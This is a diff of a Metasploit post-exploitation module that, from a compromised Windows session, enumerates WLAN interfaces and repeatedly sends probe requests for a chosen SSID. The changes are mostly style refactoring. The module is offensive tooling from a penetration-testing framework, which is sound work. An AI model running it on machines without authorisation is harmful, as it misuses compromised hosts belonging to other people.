@@ -26,6 +26,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_getpid
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -43,18 +48,17 @@ class MetasploitModule < Msf::Post
     time = datastore['TIMEOUT']
 
     if ssid.length > 32
-      print_error("The SSID must be equal to or less than 32 bytes")
-      return
+      fail_with(Failure::BadConfig, 'The SSID must be equal to or less than 32 bytes')
     end
 
     mypid = client.sys.process.getpid
     @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
     @wlanapi = client.railgun.wlanapi
 
-    wlan_handle = open_handle()
+    wlan_handle = open_handle
     unless wlan_handle
       print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
-      print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
+      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')
       return
     end
 
@@ -62,10 +66,10 @@ class MetasploitModule < Msf::Post
     #    ULONG uSSIDLength;
     #    UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];
     # } DOT11_SSID, *PDOT11_SSID;
-    pDot11Ssid = [ssid.length].pack("L<") << ssid
+    dot_11_ssid = [ssid.length].pack('L<') << ssid
     wlan_iflist = enum_interfaces(wlan_handle)
-    if wlan_iflist.length == 0
-      print_status("Wlan interfaces not found")
+    if wlan_iflist.empty?
+      print_status('Wlan interfaces not found')
       return
     end
 
@@ -73,12 +77,12 @@ class MetasploitModule < Msf::Post
     print_status("Sending probe requests for #{time} seconds")
     begin
       ::Timeout.timeout(time) do
-        while true
+        loop do
           wlan_iflist.each do |interface|
             vprint_status("Interface Guid: #{interface['guid'].unpack('H*')[0]}")
             vprint_status("Interface State: #{interface['state']}")
-            vprint_status("DOT11_SSID payload: #{pDot11Ssid.chars.map { |c| c.ord.to_s(16) }.join(':')}")
-            @wlanapi.WlanScan(wlan_handle, interface['guid'], pDot11Ssid, nil, nil)
+            vprint_status("DOT11_SSID payload: #{dot_11_ssid.chars.map { |c| c.ord.to_s(16) }.join(':')}")
+            @wlanapi.WlanScan(wlan_handle, interface['guid'], dot_11_ssid, nil, nil)
             sleep(10)
           end
         end
@@ -86,9 +90,9 @@ class MetasploitModule < Msf::Post
     rescue ::Timeout::Error
       closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)
       if closehandle['return'] == 0
-        print_status("WlanAPI Handle closed successfully")
+        print_status('WlanAPI Handle closed successfully')
       else
-        print_error("There was an error closing the Handle")
+        print_error('There was an error closing the Handle')
       end
     end
   end
@@ -97,7 +101,7 @@ class MetasploitModule < Msf::Post
   def open_handle
     begin
       wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)
-    rescue
+    rescue StandardError
       return nil
     end
     return wlhandle['phClientHandle']
@@ -109,13 +113,13 @@ class MetasploitModule < Msf::Post
     pointer = iflist['ppInterfaceList']
 
     numifs = @host_process.memory.read(pointer, 4)
-    numifs = numifs.unpack("V")[0]
+    numifs = numifs.unpack('V')[0]
 
     interfaces = []
 
     # Set the pointer ahead to the first element in the array
     pointer = (pointer + 8)
-    (1..numifs).each do |i|
+    (1..numifs).each do |_i|
       interface = {}
       # Read the GUID (16 bytes)
       interface['guid'] = @host_process.memory.read(pointer, 16)
@@ -127,26 +131,26 @@ class MetasploitModule < Msf::Post
       state = @host_process.memory.read(pointer, 4)
       pointer = (pointer + 4)
       # Turn the state into human readable form
-      state = state.unpack("V")[0]
+      state = state.unpack('V')[0]
       case state
       when 0
-        interface['state'] = "The interface is not ready to operate."
+        interface['state'] = 'The interface is not ready to operate.'
       when 1
-        interface['state'] = "The interface is connected to a network."
+        interface['state'] = 'The interface is connected to a network.'
       when 2
-        interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
+        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'
       when 3
-        interface['state'] = "The interface is disconnecting from the current network."
+        interface['state'] = 'The interface is disconnecting from the current network.'
       when 4
-        interface['state'] = "The interface is not connected to any network."
+        interface['state'] = 'The interface is not connected to any network.'
       when 5
-        interface['state'] = "The interface is attempting to associate with a network."
+        interface['state'] = 'The interface is attempting to associate with a network.'
       when 6
-        interface['state'] = "Auto configuration is discovering the settings for the network."
+        interface['state'] = 'Auto configuration is discovering the settings for the network.'
       when 7
-        interface['state'] = "The interface is in the process of authenticating."
+        interface['state'] = 'The interface is in the process of authenticating.'
       else
-        interface['state'] = "Unknown State"
+        interface['state'] = 'Unknown State'
       end
       interfaces << interface
     end
